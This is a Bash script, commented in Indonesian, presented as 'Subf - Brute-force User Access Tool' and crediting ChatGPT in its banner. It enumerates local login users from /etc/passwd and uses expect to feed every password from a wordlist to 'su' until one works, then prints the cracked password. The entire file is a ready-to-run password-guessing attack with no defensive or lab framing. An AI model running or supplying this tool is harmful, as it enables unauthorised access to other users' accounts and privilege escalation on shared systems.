#!/bin/bash

# Warna ANSI
RED="\033[91m"
GREEN="\033[92m"
YELLOW="\033[93m"
CYAN="\033[96m"
RESET="\033[0m"

# Cek apakah 'expect' tersedia
if ! command -v expect >/dev/null 2>&1; then
    echo -e "${RED}[ERROR]${RESET} Paket 'expect' tidak ditemukan."
    echo -e "${YELLOW}Silakan install dengan: ${RESET}sudo apt install expect"
    exit 1
fi

print_header() {
    local width=60
    echo -e "${CYAN}┌$(printf '─%.0s' $(seq 1 $width))┐${RESET}"
    echo -e "${CYAN}│ Subf - Brute-force User Access Tool${RESET}" | awk -v w=$width '{printf "│ %-*s│\n", w, $0}'
    echo -e "${CYAN}│ Author: ChatGPT - Enhanced Bash Version${RESET}" | awk -v w=$width '{printf "│ %-*s│\n", w, $0}'
    echo -e "${CYAN}└$(printf '─%.0s' $(seq 1 $width))┘${RESET}"
    echo
}

# Validasi argumen
WORDLIST="$1"
USER="$2"

if [[ -z "$WORDLIST" || ! -f "$WORDLIST" ]]; then
    echo -e "${RED}[ERROR]${RESET} Wordlist tidak ditemukan atau tidak valid."
    echo "Usage: $0 wordlist.txt [username]"
    exit 1
fi

# Ambil user login valid dari /etc/passwd jika tidak diset
if [[ -z "$USER" ]]; then
    SHELLS="/bin/bash /bin/sh /bin/zsh /bin/dash /bin/ksh /usr/bin/bash /usr/bin/zsh /usr/bin/sh /usr/local/bin/bash"
    echo -e "${YELLOW}Pilih user target dari daftar berikut:${RESET}"
    i=1
    mapfile -t USERS < <(awk -F: -v shells="$SHELLS" 'BEGIN{split(shells,s)} $7 in s {print $1}' /etc/passwd)
    for user in "${!USERS[@]}"; do
        printf "  [%2d] %-15s" $((user+1)) "${USERS[user]}"
        if (( (user+1) % 3 == 0 )); then echo; fi
    done
    echo
    while true; do
        read -rp "Masukkan nomor user (1-${#USERS[@]}): " idx
        if [[ "$idx" =~ ^[0-9]+$ ]] && (( idx >= 1 && idx <= ${#USERS[@]} )); then
            USER="${USERS[idx-1]}"
            break
        else
            echo -e "${RED}Input tidak valid!${RESET} Coba lagi."
        fi
    done
fi

print_header
echo -e "${CYAN}[INFO]${RESET} Target user   : $USER"
total_passwords=$(wc -l < "$WORDLIST")
echo -e "${CYAN}[INFO]${RESET} Total password: $total_passwords"
echo -e "${CYAN}[INFO]${RESET} Mulai brute-force...\n"

i=1
while IFS= read -r password; do
    # Hitung persentase
    percent=$(( i * 100 / total_passwords ))

    # Tampilkan progress
    printf "\r${CYAN}[%-3d%%]${RESET} Mencoba password: %-20s" "$percent" "$password"

    RESULT=$(expect -c "
        log_user 0
        spawn su $USER -c id
        expect {
            \"Password:\" {
                send \"$password\r\"
                expect {
                    -re \"uid=.*gid=.*\" {
                        send_user \"\n${GREEN}[SUCCESS]${RESET} Password ditemukan: $password\n\"
                        exit 0
                    }
                    \"su: Authentication failure\" {
                        exit 1
                    }
                    timeout {
                        exit 1
                    }
                }
            }
            timeout {
                exit 1
            }
        }
    " 2>/dev/null)

    if [[ $? -eq 0 ]]; then
        echo -e "$RESULT"
        exit 0
    fi
    ((i++))
done < "$WORDLIST"

echo -e "\n${RED}[FAILED]${RESET} Tidak menemukan password yang cocok."